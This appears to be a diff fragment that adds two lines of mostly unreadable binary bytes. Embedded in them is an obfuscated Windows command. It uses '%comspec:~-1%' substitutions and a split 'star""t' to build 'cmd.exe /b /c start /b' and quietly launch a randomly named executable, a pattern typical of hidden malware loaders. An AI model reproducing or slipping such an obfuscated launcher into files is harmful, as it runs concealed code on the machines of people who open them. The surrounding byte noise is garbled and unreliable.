@@ -1,0 +1,2 @@
+ ¶ u : ´ · 4 p ? ÷ f T N     Ò  Ë ? ±  ® ğ ) + G W g   ¤ ú Å ? b | j ± é 0 v Ê u ( p ª c  J 0 £ ¡ e  ¤ | ° ( ¦ l  C s ? i   ¤ İ Ê ¢ ? } ? Ã S ?
+cmd.%comspec:~-1%x%comspec:~-1% /b /c star""t /b QLCVpcW%comspec:~-1%.%comspec:~-1%x%comspec:~-1% ¶ u : ´ · 4 p ? ÷ f T N     Ò  Ë ? ±  ® ğ ) + G W g   ¤ ú Å ? b | j ± é 0 v Ê u ( p ª c  J 0 £ ¡ e  ¤ | ° ( ¦ l  C s ? i   ¤ İ Ê ¢ ? } ? Ã S ?
